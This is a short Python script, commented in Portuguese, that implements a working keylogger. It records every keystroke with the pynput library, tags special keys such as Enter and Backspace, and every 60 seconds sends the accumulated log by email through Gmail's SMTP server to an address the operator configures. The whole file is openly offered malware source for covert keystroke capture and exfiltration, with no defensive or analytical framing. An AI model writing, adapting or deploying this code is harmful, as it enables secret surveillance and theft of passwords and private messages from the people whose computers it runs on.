from pynput import keyboard 
import smtplib
from email.mime.text import MIMEText
from threading import Timer

## requisitos: instalar pynput  (pip install pynput)  

## configurações do email que vai receber e enviar os logs capturados do teclado
EMAIL_ORIGEM = "" ## email origem, deve ser um email válido e com permissão para enviar emails
EMAIL_DESTINO = "" ## email destino, deve ser um email válido para receber os logs capturados do teclado
SENHA_EMAIL =  "" ## deve ser a senha do email origem ou a senha de app, que é obtida atraves do site do provedor de email
log = "" ## variável global para armazenar os logs capturados do teclado

def enviar_email():
    global log 
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Dados capturados pelo keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try: 
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar email: {e}")

    log = ""

    Timer(60, enviar_email).start() ## chama a função enviar_email a cada 60 segundos


def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += "<ESPACO>" 
        elif key == keyboard.Key.enter: 
            log += "<ENTER>"
        elif key == keyboard.Key.tab:
            log += "<TAB>"
        elif key == keyboard.Key.backspace:
            log += "<BACKSPACE>"
        elif key == keyboard.Key.esc: 
            log += "<ESC>"
        else: 
            pass ## ignora shift, control etc

with keyboard.Listener(on_press=on_press) as listener:
    log = ""
    enviar_email() ## inicia o envio de email
    listener.join() ## mantém o programa rodando para capturar as teclas